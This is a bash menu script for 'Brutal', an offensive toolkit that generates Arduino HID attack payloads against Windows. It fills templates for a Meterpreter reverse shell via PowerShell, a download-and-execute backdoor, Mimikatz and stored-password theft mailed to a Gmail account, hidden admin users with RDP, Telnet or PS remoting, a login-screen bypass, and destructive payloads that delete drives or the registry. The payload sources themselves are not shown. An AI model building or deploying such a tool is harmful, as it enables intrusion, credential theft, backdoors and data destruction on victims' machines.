#!/usr/bin/env bash


#============================================================================================================
#                               BRUTAL
#
#                       Welcome and dont disclaimer
#                     Brutal Author By Edo -maland-
#         
#       contact me in screetsec@dracos-linux.org
#          OS Penetration From Indonesia : https://dracos-linux.org/
#============================================================================================================


#This colour
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m'

###################################################
# CTRL C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit ..."
sleep 1
echo ""
echo -e $yellow"[*] Thank You For Using  =)."
echo ""
echo -e $white"[*] We Live by The Code , and Was Raised by Ethics  "
read enter
exit
}

###################################################
# exploit
###################################################
doxec='src/exploit/DownloadExecute.ino'
meinject='src/exploit/MeterpreterInjection-pwrshell.ino'
doxecopt='output/DownloadExecute.ino'
doxecopt1='output/DownloadExecute-Final.ino'
meinjectopt='output/MeterpreterInjection-powershell.ino'


###################################################
# attack windows
##################################################
attack1='src/atckwin/CrashPC-Forever.ino'
attack1opt='output/CrashPC-Forever-Final.ino'
attack2='src/atckwin/Delete_AllDrive.ino'
attack2opt='output/Delete_AllDrive_Final.ino'
attack3='src/atckwin/Delete_Registry.ino'
attack3opt='output/Delete_Registry_Final.ino'
attack4='src/atckwin/Delete_SystemDrive.ino'
attack4opt='output/Delete_SystemDrive_Final.ino'
attack5='src/atckwin/Goodbye-Windows.ino'
attack5opt='output/Goodbye-Windows-Final.ino'
attack6='src/atckwin/Rename-all-file-to-txt.ino'
attack6opt='output/Rename-all-file-to-txt-final.ino'

###################################################
# tools
###################################################
pwned='python tools/script/pw_exec.py'

###################################################
# prank
###################################################
prank1='src/prank/Hellow-World.ino'
prank1opt='output/Hellow-World.ino'
prank2='src/prank/write-message.ino'
prank2opt='output/Wrie-Your-Message.ino'
prank3='src/prank/Dont-fuck-it-up.ino'
prank3opt='output/Dont-Fuck-it-Up.ino'
prank4='src/prank/Lockyourcomputer.ino'
prank4opt='output/Learn-Lock-YourComputer.ino'
prank5='src/prank/Screen-rotation-pranks.ino'
prank5opt='output/Screen-Rotation-Pranks.ino'
prank6='src/prank/shutdown-prank.ino'
prank6opt='output/Shutdown-Prank.ino'
prank7='src/prank/youtube-rick-roll.ino'
prank7opt='output/Youtube-Prank'
prank8='src/prank/AutoFacebookPost.ino'
prank8opt='output/AutoFacebookPost.ino'
prank9='src/prank/Fork-Bomb.ino'
prank9opt='output/Fork-Bom-Final.ino'


###################################################
# gathering and dump password
##################################################
gathering1='src/gathering/mimikatz.ino'
gathering1opt='output/Mimikatz-attack.ino'
gathering1opt1='output/Mimikatz-attack-temp.ino'
gathering1opt2='output/Mimikatz-attack-final.ino'
gathering2='src/gathering/Get_all_password.ino'
gathering2opt='output/Get_passwordyo.ino'
gathering2opt1='output/GetPassword-temp.ino'
gathering2opt2='output/Get-All-Password-final.ino'

###################################################
# manage
###################################################
manage1='src/manage/add_user_admin.ino'
manage1opt='output/Add_User_Admin.ino'
manage1opt1='output/Add_user_Admin_Final.ino'
manage2='src/manage/add_user+enable_rdp.ino'
manage2opt='output/Add_user+Enable_rdp.indo'
manage2opt2='output/Add_user+Enable_rdp_Final.indo'
manage3='src/manage/add_user_telnet.ino'
manage3opt='output/Add_user_telnet.ino'
manage3opt3='output/Add_user_telnet_Final.ino'
manage4='src/manage/add_user_telnet+rdp.ino'
manage4opt='output/Add_user_telnet+rdp.ino'
manage4opt4='output/Add_user_telnet+rdp_Final.ino'
manage5='src/manage/add_user+psremoting.ino'
manage5opt='output/Add_user+PsRemoting.ino'
manage5opt5='output/Add_user+PsRemoting_Final.ino'
manage6='src/manage/Bypass_Admin_Window.ino'
manage6opt='output/Bypass_admin_windows.ino'

###################################################
codename='Reaper'
version='1.0'
###################################################


###################################################
# another temp
###################################################
temp='temp/backdoor.txt'
mail='temp/mail.txt'
user='temp/user.txt'


function mmanage() {
	clear
echo -e $white"	"
echo "  "
echo "         _______________          |*\_/*|________ "
echo "        |  ___________  |        ||_/-\_|______  | "
echo "        | |           | |        | |           | | "
echo "        | |   0   0   | |        | |   0   0   | | "
echo "        | |     -     | |        | |     -     | | "
echo "        | |   \___/   | |        | |   \___/   | | "
echo "        | |___     ___| |        | |___________| | "
echo "        |_____|\_/|_____|        |_______________| "
echo "          _|__|/ \|_|_.............._|________|_ "
echo "         / ********** \            / ********** \ "
echo "       /  ************  \        /  ************  \ "
echo "      --------------------      -------------------- "
echo -e $BlueF"    __   __  _______  __    _  _______  _______  _______ ";
echo "   |  |_|  ||   _   ||  |  | ||   _   ||       ||       |";
echo "   |       ||  |_|  ||   |_| ||  |_|  ||    ___||    ___|";
echo "   |       ||       ||       ||       ||   | __ |   |___ ";
echo "   |       ||       ||  _    ||       ||   ||  ||    ___|";
echo "   | ||_|| ||   _   || | |   ||   _   ||   |_| ||   |___ ";
echo "   |_|   |_||__| |__||_|  |__||__| |__||_______||_______|";
echo "                                                      ";
echo "                                                      ";
	echo -e $BlueF"	[$white"01"$BlueF]$cyan  Add an Admin User  "
	echo -e $BlueF"	[$white"02"$BlueF]$cyan  Add a User and Enbale RDP  "
	echo -e $BlueF"	[$white"03"$BlueF]$cyan  Add a User and Enable Telnet   "
	echo -e $BlueF"	[$white"04"$BlueF]$cyan  Add a User and Enable RDP + Telnet  "
	echo -e $BlueF"	[$white"05"$BlueF]$cyan  Add a User and Enable Ps Remoting "
	echo -e $BlueF"	[$white"06"$BlueF]$cyan  Bypass Admin Login Screen "
	echo -e $BlueF"	[$white"07"$BlueF]$cyan  Back  "
	echo -e " "
	echo -n -e $red'  \033[4mScreetsec@Manage:\033[0m >> '; tput sgr0 #insert your choice
	read manage
	echo -e $white"  --------------------------------------------------------------   ";
	if test $manage == '1'
		then
			echo ""
			echo -e $red"  Note : You can edit all the Payload In src folder "
			echo ""
			touch $user
			echo -ne $okegreen"  Enter Username for the user to be added: " ; tput sgr0
			read usr
			echo
			echo -ne $okegreen"  Enter Password for the user to be added: " ; tput sgr0
			read -s pss
			echo $usr $pss > "$user"
			s0=$(cat $user | cut -d ' ' -f1)
			s1=$(cat $user | cut -d ' ' -f2)
			sed s/USER_SCREETSEC/$s0/g $manage1 > $manage1opt
			sleep 2
			sed s/PASSWORD_SCREETSEC/$s1/g $manage1opt > $manage1opt1
			echo ""
			sleep 1
			echo -e $white " Succes Create Payload "
			echo -e $white"  --------------------------------------------------------------   ";
			echo ""
			echo -e $yellow " Now Copy the generated $manage1opt1 to your HID "

 elif test $manage == '2'
		then
			echo ""
			echo -e $red"  Note : You can edit all the Payload In src folder "
			echo ""
			touch $user
			echo -ne $okegreen"  Enter Username for the user to be added: " ; tput sgr0
			read usr
			echo
			echo -ne $okegreen"  Enter Password for the user to be added: " ; tput sgr0
			read -s pss
			echo $usr $pss > "$user"
			s0=$(cat $user | cut -d ' ' -f1)
			s1=$(cat $user | cut -d ' ' -f2)
			sed s/USER_SCREETSEC/$s0/g $manage2 > $manage2opt
			sleep 2
			sed s/PASSWORD_SCREETSEC/$s1/g $manage2opt > $manage2opt2
			echo ""
			sleep 1
			echo -e $white " Succes Create Payload "
			echo -e $white"  --------------------------------------------------------------   ";
			echo ""
			echo -e $yellow " Now Copy the generated $manage2opt2 to your HID "
	elif test $manage == '3'
		then
			echo ""
			echo -e $red"  Note : You can edit all the Payload In src folder "
			echo ""
			touch $user
			echo -ne $okegreen"  Enter Username for the user to be added: " ; tput sgr0
			read usr
			echo
			echo -ne $okegreen"  Enter Password for the user to be added: " ; tput sgr0
			read -s pss
			echo $usr $pss > "$user"
			s0=$(cat $user | cut -d ' ' -f1)
			s1=$(cat $user | cut -d ' ' -f2)
			sed s/USER_SCREETSEC/$s0/g $manage3 > $manage3opt
			sleep 2
			sed s/PASSWORD_SCREETSEC/$s1/g $manage3opt > $manage3opt3
			echo ""
			sleep 1
			echo -e $white " Succes Create Payload "
			echo -e $white"  --------------------------------------------------------------   ";
			echo ""
			echo -e $yellow " Now Copy the generated $manage3opt3 to your HID "
		elif test $manage == '4'
			then
				echo ""
				echo -e $red"  Note : You can edit all the Payload In src folder "
				echo ""
				touch $user
				echo -ne $okegreen"  Enter Username for the user to be added: " ; tput sgr0
				read usr
				echo
				echo -ne $okegreen"  Enter Password for the user to be added: " ; tput sgr0
				read -s pss
				echo $usr $pss > "$user"
				s0=$(cat $user | cut -d ' ' -f1)
				s1=$(cat $user | cut -d ' ' -f2)
				sed s/USER_SCREETSEC/$s0/g $manage4 > $manage4opt
				sleep 2
				sed s/PASSWORD_SCREETSEC/$s1/g $manage4opt > $manage4opt4
				echo ""
				sleep 1
				echo -e $white " Succes Create Payload "
				echo -e $white"  --------------------------------------------------------------   ";
				echo ""
				echo -e $yellow " Now Copy the generated $manage4opt4 to your HID "
		elif test $manage == '5'
			then
				echo ""
				echo -e $red"  Note : You can edit all the Payload In src folder "
				echo ""
				touch $user
				echo -ne $okegreen"  Enter Username for the user to be added: " ; tput sgr0
				read usr
				echo
				echo -ne $okegreen"  Enter Password for the user to be added: " ; tput sgr0
				read -s pss
				echo $usr $pss > "$user"
				s0=$(cat $user | cut -d ' ' -f1)
				s1=$(cat $user | cut -d ' ' -f2)
				sed s/USER_SCREETSEC/$s0/g $manage5 > $manage5opt
				sleep 2
				sed s/PASSWORD_SCREETSEC/$s1/g $manage5opt > $manage5opt5
				echo ""
				sleep 1
				echo -e $white " Succes Create Payload "
				echo -e $white"  --------------------------------------------------------------   ";
				echo ""
				echo -e $yellow " Now Copy the generated $manage5opt5 to your HID "

			elif test $manage == '6'
				then
					echo ""
					echo -e $red"  Note : Press shift five times when on the pc on login screen "
					echo -e $okegreen " Wait ............ "
					echo ""
					sleep 2
					cp $manage6 $manage6opt
					echo -e $okegreen " Succes Create Payload "
					echo -e $white"  --------------------------------------------------------------   ";
					echo ""
					echo -e $yellow " Now Copy the generated $manage6opt to your HID "
					echo ""

			elif test $manage == '7'
						then
			      menu
			    else
			        echo ""
			        echo -e $okegreen " Incorrect Number"
			      fi
			      echo ""
			      echo ""
			      echo -n -e $red " Do You want Exit? ( Yes / No ) :"
						read back
									if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
											then
											clear
											exit
									elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
											then
			        mmanage
			    fi
			}








function mprank() {
	clear
echo -e $red "	"
echo "	"
echo "        		       _"
echo "		--            / | "
echo "		\   \        /  | "
echo "		 \    \     /   / "
echo "		   \   \   |   / "
echo "		     \  \  | /  "
echo "		      _\ \/ / "
echo "		    '      < "
echo "		  / (@)     \ "
echo "		 (           | "
echo "		  \..       / "
echo "		     | ____/ "
echo "		    (V) === "
echo "		    (A)"
echo -e $white"____________________    _____    _______   ____  __.";
echo "\______   \______   \  /  _  \   \      \ |    |/ _|";
echo " |     ___/|       _/ /  /_\  \  /   |   \|      <  ";
echo " |    |    |    |   \/    |    \/    |    \    |  \ ";
echo " |____|    |____|_  /\____|__  /\____|__  /____|__ \ ";
echo "                  \/         \/         \/        \/ ";
echo "                                                     ";
echo "                                                     ";
	echo -e $BlueF"	[$white"01"$BlueF]$cyan  Simple Payload Hellow World  "
	echo -e $BlueF"	[$white"02"$BlueF]$cyan  Don't Fuck It Up  "
	echo -e $BlueF"	[$white"03"$BlueF]$cyan  I Will Learn to Lock My Computer    "
	echo -e $BlueF"	[$white"04"$BlueF]$cyan  Write a mesagge to notepad  "
	echo -e $BlueF"	[$white"05"$BlueF]$cyan  Screen Rotation Prank "
	echo -e $BlueF"	[$white"06"$BlueF]$cyan  Auto Shutdown prank  "
	echo -e $BlueF"	[$white"07"$BlueF]$cyan  Play youtube Rick Roll "
	echo -e $BlueF"	[$white"08"$BlueF]$cyan  Auto Facebook Post  "
	echo -e $BlueF"	[$white"09"$BlueF]$cyan  Crashing Windows with Fork Bomb  "
	echo -e $BlueF"	[$white"10"$BlueF]$cyan  Back  "
	echo -e " "
	echo -n -e $red'  \033[4mScreetsec@Prank:\033[0m >> '; tput sgr0 #insert your choice
	read Prank
	echo -e $white"  --------------------------------------------------------------   ";
	if test $Prank == '1'
		then
			echo ""
			echo -e $red"  Note : You can edit all the Payload In src folder "
			echo -e $okegreen " Wait ............ "
			echo ""
			sleep 2
			cp $prank1 $prank1opt
			echo -e $okegreen " Succes Create Payload "
			echo -e $white"  --------------------------------------------------------------   ";
			echo ""
			echo -e $yellow " Now Copy the generated $prank1opt to your HID "
			echo ""
	elif test $Prank == '2'
		then
			echo ""
			echo -e $yellow"  Note : You can edit all the Payload In src folder "
			echo -e $okegreen " Wait ............ "
			echo ""
			sleep 2
			cp $prank3 $prank3opt
			echo -e $okegreen " Succes Create Payload "
			echo -e $white"  --------------------------------------------------------------   ";
			echo ""
			echo -e $yellow " Now Copy the generated $prank3opt to your HID "
			echo ""
	elif test $Prank == '3'
		then
			echo ""
			echo -e $red"  Note : You can edit all the Payload In src folder "
			echo -e $okegreen " Wait ............ "
			echo ""
			sleep 2
			cp $prank4 $prank4opt
			echo -e $okegreen " Succes Create Payload "
			echo -e $white"  --------------------------------------------------------------   ";
			echo ""
			echo -e $yellow " Now Copy the generated $prank4opt to your HID "
			echo ""
		elif test $Prank == '4'
			then
				echo ""
				echo -e $red"  Note : You can edit all the Payload In src folder "
				echo -e $okegreen " Wait ............ "
				echo ""
				sleep 2
				cp $prank2 $prank2opt
				echo -e $okegreen " Succes Create Payload "
				echo -e $white"  --------------------------------------------------------------   ";
				echo ""
				echo -e $yellow " Now Copy the generated $prank2opt to your HID "
				echo ""
		elif test $Prank == '5'
			then
				echo ""
				echo -e $red"  Note : You can edit all the Payload In src folder "
				echo -e $okegreen " Wait ............ "
				echo ""
				sleep 2
				cp $prank5 $prank5opt
				echo -e $okegreen " Succes Create Payload "
				echo -e $white"  --------------------------------------------------------------   ";
				echo ""
				echo -e $yellow " Now Copy the generated $prank5opt to your HID "
				echo ""
			elif test $Prank == '6'
				then
					echo ""
					echo -e $red"  Note : You can edit all the Payload In src folder "
					echo -e $okegreen " Wait ............ "
					echo ""
					sleep 2
					cp $prank6 $prank6opt
					echo -e $okegreen " Succes Create Payload "
					echo -e $white"  --------------------------------------------------------------   ";
					echo ""
					echo -e $yellow " Now Copy the generated $prank6opt to your HID "
					echo ""
				elif test $Prank == '7'
					then
						echo ""
						echo -e $red"  Note : You can edit all the Payload In src folder "
						echo -e $okegreen " Wait ............ "
						echo ""
						sleep 2
						cp $prank7 $prank7opt
						echo -e $okegreen " Succes Create Payload "
						echo -e $white"  --------------------------------------------------------------   ";
						echo ""
						echo -e $yellow " Now Copy the generated $prank7opt to your HID "
						echo ""
					elif test $Prank == '8'
						then
							echo ""
							echo -e $red"  Note : You can edit all the Payload In src folder "
							echo -e $okegreen " Wait ............ "
							echo ""
							sleep 2
							cp $prank8 $prank8opt
							echo -e $okegreen " Succes Create Payload "
							echo -e $white"  --------------------------------------------------------------   ";
							echo ""
							echo -e $yellow " Now Copy the generated $prank8opt to your HID "
							echo ""

					elif test $Prank == '9'
						then
								echo ""
								echo -e $red"  Note : You can edit all the Payload In src folder "
								echo -e $okegreen " Wait ............ "
								echo ""
								sleep 2
								cp $prank9 $prank9opt
								echo -e $okegreen " Succes Create Payload "
								echo -e $white"  --------------------------------------------------------------   ";
								echo ""
								echo -e $yellow " Now Copy the generated $prank9opt to your HID "
								echo ""
						elif test $Prank == '10'
						then
			      menu
			    else
			        echo ""
			        echo -e $okegreen " Incorrect Number"
			      fi
			      echo ""
			      echo ""
			      echo -n -e $red " Do You want Exit? ( Yes / No ) :"
						read back
									if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
											then
											clear
											exit
									elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
											then
			        mprank
			    fi
			}


function mattack() {
	clear
echo -e $white""
echo "	          |\         __  __   _          _                   "
echo "	          | \       / / /\ \ (_)_ __  __| | _____      _____ "
echo "	()########|  ===================================================> "
echo "	          | /       \  /\  /| | | | | (_| | (_) \ V  V /\__ \ "
echo "	          |/         \/  \/ |_|_| |_|\__,_|\___/ \_/\_/ |___/ "
echo "                                          ";
echo "                                          ";
	echo -e $BlueF"	[$white"01"$BlueF]$cyan  Crash Windows Forever lol  "
	echo -e $BlueF"	[$white"02"$BlueF]$cyan  Delete All Drive  "
	echo -e $BlueF"	[$white"03"$BlueF]$cyan  Delete All Registry    "
	echo -e $BlueF"	[$white"04"$BlueF]$cyan  Delete System Drive  "
	echo -e $BlueF"	[$white"05"$BlueF]$cyan  GoodBye Windows "
	echo -e $BlueF"	[$white"06"$BlueF]$cyan  Rename All File to txt  "
	echo -e $BlueF"	[$white"07"$BlueF]$cyan  Back  "
	echo -e " "
	echo -n -e $red'  \033[4mScreetsec@Prank:\033[0m >> '; tput sgr0 #insert your choice
	read atckwin
	echo -e $white"  --------------------------------------------------------------   ";
	if test $atckwin == '1'
		then
			echo ""
			echo -e $red"  Note : You can edit all the Payload In src folder "
			echo -e $okegreen " Wait ............ "
			echo ""
			sleep 2
			cp $attack1 $attack1opt
			echo -e $okegreen " Succes Create Payload "
			echo -e $white"  --------------------------------------------------------------   ";
			echo ""
			echo -e $yellow " Now Copy the generated $attack1opt to your HID "
			echo ""
	elif test $atckwin == '2'
		then
			echo ""
			echo -e $yellow"  Note : You can edit all the Payload In src folder "
			echo -e $okegreen " Wait ............ "
			echo ""
			sleep 2
			cp $attack2 $attack2opt
			echo -e $okegreen " Succes Create Payload "
			echo -e $white"  --------------------------------------------------------------   ";
			echo ""
			echo -e $yellow " Now Copy the generated $attack2opt to your HID "
			echo ""
	elif test $atckwin == '3'
		then
			echo ""
			echo -e $red"  Note : You can edit all the Payload In src folder "
			echo -e $okegreen " Wait ............ "
			echo ""
			sleep 2
			cp $attack3 $attack3opt
			echo -e $okegreen " Succes Create Payload "
			echo -e $white"  --------------------------------------------------------------   ";
			echo ""
			echo -e $yellow " Now Copy the generated $attack3opt to your HID "
			echo ""
		elif test $atckwin == '4'
			then
				echo ""
				echo -e $red"  Note : You can edit all the Payload In src folder "
				echo -e $okegreen " Wait ............ "
				echo ""
				sleep 2
				cp $attack4 $attack4opt
				echo -e $okegreen " Succes Create Payload "
				echo -e $white"  --------------------------------------------------------------   ";
				echo ""
				echo -e $yellow " Now Copy the generated $attack4opt to your HID "
				echo ""
		elif test $atckwin == '5'
			then
				echo ""
				echo -e $red"  Note : You can edit all the Payload In src folder "
				echo -e $okegreen " Wait ............ "
				echo ""
				sleep 2
				cp $attack5 $attack5opt
				echo -e $okegreen " Succes Create Payload "
				echo -e $white"  --------------------------------------------------------------   ";
				echo ""
				echo -e $yellow " Now Copy the generated $attack5opt to your HID "
				echo ""
			elif test $atckwin == '6'
				then
					echo ""
					echo -e $red"  Note : You can edit all the Payload In src folder "
					echo -e $okegreen " Wait ............ "
					echo ""
					sleep 2
					cp $attack6 $attack6opt
					echo -e $okegreen " Succes Create Payload "
					echo -e $white"  --------------------------------------------------------------   ";
					echo ""
					echo -e $yellow " Now Copy the generated $attack6opt to your HID "
					echo ""

				elif test $atckwin == '7'
						then
			      menu
			    else
			        echo ""
			        echo -e $okegreen " Incorrect Number"
			      fi
			      echo ""
			      echo ""
			      echo -n -e $red " Do You want Exit? ( Yes / No ) :"
						read back
									if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
											then
											clear
											exit
									elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
											then
			        mattack
			    fi
			}


#######################################################
# CREDITS
#######################################################
function credits {
clear
echo -e "
\033[31m##########################################################################\033[m
		             Credits To
\033[31m##########################################################################\033[m"
echo
echo -e $white "Special thanks to:"
echo
echo -e $red "Dracos Linux ( www.dracos-linux.org )"
echo
echo -e $okegreen "Offensive Security for the awesome OS"
echo
echo -e $green "http://www.offensive-security.com/"
echo
echo -e $yellow "http://www.kali.org/"
echo
echo -e $cyan "http://www.kitploit.com/"
echo
echo -e $white "http://www.linuxsec.org/"
echo
echo -e $okegreen "My Friend for helpme ( Boy Suganda )"
echo
echo -e $red "Big Thanks to : http://www.github.com/"
echo
echo -e "
\033[31m##########################################################################\033[m
		             Thanks Babe
\033[31m##########################################################################\033[m"
}



function menu()
{
clear
echo -e $white""
echo "                                _________-----_____ "
echo "                     _____------           __      ----_ "
echo "             ___----             ___------              \ "
echo "                ----________        ----                 \ "
echo -e "                            -----__    |            "$red" _____$white) "
echo -e "                                 __-                "$red"/#####$white\ "
echo -e "                     _______-----    ___--          "$red"\####/$white)\ "
echo -e "               ------_______      ---____            "$red"\##/  $white/ "
echo -e "                            -----__    \ --    _      "$red"-- $white  /\   "
echo "                                   --__--__     \_____/   \_/\ "
echo "                                          ----|   /          | "
echo -e $BlueF"  __________                __         .__  "$white"  |  |___________| "
echo -e $BlueF"  \______   \_______ __ ___/  |______  |  |   "$white"|  "$white"| ((_(_)| )_) "
echo -e $BlueF"   |    |  _/\_  __ \  |  \   __\__  \ |  |   "$white"|  "$white"\_((_(_)|/(_) "
echo -e $BlueF"   |    |   \ |  | \/  |  /|  |  / __ \|  |__ "$white"\             ( "
echo -e $BlueF"   |______  / |__|  |____/ |__| (____  /____/  "$white"\_____________) "
echo -e $BlueF"       \/                         \/                  "$BlueF"   /"
echo -e $BlueF"   | "$cyan"Brutall Created By   "$white": "$red"Edo Maland ( Screetsec )   "$BlueF" /"
echo -e $BlueF"   | "$cyan"Version              "$white": "$red"$version                       "$BlueF" /"
echo -e $BlueF"   | "$cyan"Codename             "$white": "$red"$codename	             "$BlueF" /"
echo -e $BlueF"   | "$cyan"Follow me on Github  "$white": "$red"@Screetsec               "$BlueF"/"
echo -e $BlueF"   | "$cyan"Dracos Linux         "$white": "$red"dracos-linux.org        "$BlueF"/"
echo -e "$BlueF""   ------------------------------------------------"
echo -e $white " "
echo -e $BlueF"	[$white"01"$BlueF]$cyan  Meterpreter Reverse TCP Injection using Powershell  "
echo -e $BlueF"	[$white"02"$BlueF]$cyan  Download and Execute Backdoor  "
echo -e $BlueF"	[$white"03"$BlueF]$cyan  Get Credential information With Mimikatz [ Send to gmail ]    "
echo -e $BlueF"	[$white"04"$BlueF]$cyan  Retrieve lots of passwords stored on a local computer [ gmail ]  "
echo -e $BlueF"	[$white"05"$BlueF]$cyan  Payload Prank for attack computer [ Fun with Windows ] "
echo -e $BlueF"	[$white"06"$BlueF]$cyan  Payload to Manage Windows [ add user,rdp enable,telnet ] "
echo -e $BlueF"	[$white"07"$BlueF]$cyan  Attacking Windows [ At your Own Risk ]"
echo -e $BlueF"	[$white"08"$BlueF]$cyan  Help and Tutorials "
echo -e $BlueF"	[$white"09"$BlueF]$cyan  Credits  "
echo -e $BlueF"	[$white"10"$BlueF]$cyan  Exit  "

echo -e " "
echo -n -e $red'  \033[4mScreetsec@Brutal:\033[0m >> '; tput sgr0 #insert your choice
read Dracos
echo -e $white"  --------------------------------------------------------------   ";
		if test $Dracos == '1'
				then
					echo ""
					echo -e $okegreen""
					echo -ne "  SET LHOST : ";tput sgr0
					read yourip
					echo ""
					echo -ne $okegreen " SET LPORT : ";tput sgr0
					read yourport
					echo ""
					payload=$(zenity --list --title "☣ PAYLOAD ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1
					echo ""
					echo ""
					$pwned $payload $yourip $yourport > /dev/null 2>&1
					cat powershell_attack.txt
					echo ""
					s0=$(cat powershell_attack.txt | cut -d ' ' -f5)
					sed s/POWERSHELLATTACK/$s0/g $meinject > $meinjectopt
					sleep 2
					echo ""
					rm powershell_attack.txt unicorn.rc
					echo -e $okegreen " Succes Create Payload "
					echo -e $white"  --------------------------------------------------------------   ";
					echo ""
					echo -e $yellow " Now Copy the generated $meinjectopt to your HID "
					echo ""
		elif test $Dracos == '2'
	 			then
					echo ""
					echo -e $red"  Note : You can upload your backdoor into your server "
					echo -e $okegreen " Wait , starting apache server ...... "
					service apache2 start
					echo ""
					touch $temp
					echo -ne $okegreen"  The Name Your Backdoor : " ; tput sgr0
					read guu
					echo ""
				        echo -ne $okegreen"  Located your file or backdoor ( /var/www/html/Backdoor.exe)  : "
				  read gii
					echo $guu $gii > "$temp"
					s0=$(cat $temp | cut -d ' ' -f1)
					s1=$(cat $temp | cut -d ' ' -f2)
					sed s#NAMABACKDOOR#$s0#g $doxec > $doxecopt
					sed s#LOKASIBACKDOOR#$s1#g $doxecopt >$doxecopt1
					echo ""
					sleep 1
					echo -e $white " Succes Create Payload "
					echo -e $white"  --------------------------------------------------------------   ";
					echo ""
					echo -e $yellow " Now Copy the generated $doxecopt1 to your HID "
					echo ""
			elif test $Dracos == '3'
				then
					echo ""
					echo -e $red"  Note : You must setting your account gmail in : "
					echo -e $yellow"  https://www.google.com/settings/security/lesssecureapps "
					echo ""
					echo -ne $okegreen " Input your email  :  "; tput sgr0
					read put
					echo ""
					echo -ne $okegreen " Input your password :  "; tput sgr0
					read -s pass
					echo ""
					echo ""
					echo -ne $okegreen " File Recieved send to : "; tput sgr0
					read send
					touch $mail
					echo $put $pass $send > "$mail"
					s0=$(cat $mail | cut -d ' ' -f1)
					s1=$(cat $mail | cut -d ' ' -f2)
					s2=$(cat $mail | cut -d ' ' -f3)
					sed s#FROM_SCREETSEC#$s0#g $gathering1 > $gathering1opt
					sed s#PASSWORD_SCREETSEC#$s1#g $gathering1opt > $gathering1opt1
					sed s#KE_SCREETSEC#$s2#g $gathering1opt1 > $gathering1opt2
					sleep 2
					rm $gathering1opt $gathering1opt1
					echo ""
					sleep 1
					echo -e $white " Succes Create Payload "
					echo -e $white"  --------------------------------------------------------------   ";
					echo ""
					echo -e $yellow " Now Copy the generated $gathering1opt2 to your HID "
					echo ""
				elif test $Dracos == '4'
					then
						echo ""
						echo -e $red"  Note : You must setting your account gmail in : "
						echo -e $yellow"  https://www.google.com/settings/security/lesssecureapps "
						echo ""
						echo -ne $okegreen " Input your email  :  "; tput sgr0
						read put
						echo ""
						echo -ne $okegreen " Input your password :  "; tput sgr0
						read -s pass
						echo ""
						echo ""
						echo -ne $okegreen " File Recieved send to : "; tput sgr0
						read send
						touch $mail
						echo $put $pass $send > "$mail"
						s0=$(cat $mail | cut -d ' ' -f1)
						s1=$(cat $mail | cut -d ' ' -f2)
						s2=$(cat $mail | cut -d ' ' -f3)
						sed s#FROM_SCREETSEC#$s0#g $gathering2 > $gathering2opt
						sed s#PASSWORD_SCREETSEC#$s1#g $gathering2opt > $gathering2opt1
						sed s#KE_SCREETSEC#$s2#g $gathering2opt1 > $gathering2opt2
						sleep 2
						rm $gathering2opt $gathering2opt1
						echo ""
						sleep 1
						echo -e $white " Succes Create Payload "
						echo -e $white"  --------------------------------------------------------------   ";
						echo ""
						echo -e $yellow " Now Copy the generated $gathering2opt2 to your HID "
						echo ""

					elif test $Dracos == '5'
			      then
			        clear
			        mprank
					elif test $Dracos = '6'
						then
							clear
							mmanage
						elif test $Dracos = '7'
							then
								clear
								mattack
							elif test $Dracos = '8'
								then
									clear

								elif test $Dracos = '9'
								then
					        clear
									credits
								elif test $Dracos = '10'
								then
					        clear
									exit
				 		else
							echo -e "  Incorrect Number"
							fi
							echo -n -e $red"  Do you want exit? ( Yes / No ) :" ;tput sgr0
							read back
										if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
												then
												clear
												exit
										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
												then
												menu
				fi


}


#################################################
# MAUDIBAWAKEMANAAAAAHUBUNGANKITAAAAAA
################################################

clear
echo -e $white""
echo "                                _________-----_____ "
echo "                     _____------           __      ----_ "
echo "             ___----             ___------              \ "
echo "                ----________        ----                 \ "
echo -e "                            -----__    |            "$red" _____$white) "
echo -e "                                 __-                "$red"/#####$white\ "
echo -e "                     _______-----    ___--          "$red"\####/$white)\ "
echo -e "               ------_______      ---____            "$red"\##/  $white/ "
echo -e "                            -----__    \ --    _      "$red"-- $white  /\   "
echo "                                   --__--__     \_____/   \_/\ "
echo "                                          ----|   /          | "
echo -e $BlueF"  __________                __         .__  "$white"  |  |___________| "
echo -e $BlueF"  \______   \_______ __ ___/  |______  |  |   "$white"|  "$white"| ((_(_)| )_) "
echo -e $BlueF"   |    |  _/\_  __ \  |  \   __\__  \ |  |   "$white"|  "$white"\_((_(_)|/(_) "
echo -e $BlueF"   |    |   \ |  | \/  |  /|  |  / __ \|  |__ "$white"\             ( "
echo -e $BlueF"   |______  / |__|  |____/ |__| (____  /____/  "$white"\_____________) "
echo -e $BlueF"       \/                         \/                  "$BlueF"   /"
echo -e $BlueF"   | "$cyan"Brutall Created By   "$white": "$red"Edo Maland ( Screetsec )   "$BlueF" /"
echo -e $BlueF"   | "$cyan"Version              "$white": "$red"$version                       "$BlueF" /"
echo -e $BlueF"   | "$cyan"Codename             "$white": "$red"$codename	             "$BlueF" /"
echo -e $BlueF"   | "$cyan"Follow me on Github  "$white": "$red"@Screetsec               "$BlueF"/"
echo -e $BlueF"   | "$cyan"Dracos Linux         "$white": "$red"dracos-linux.org        "$BlueF"/"
echo -e "$BlueF""   ------------------------------------------------"
echo -e $white " "
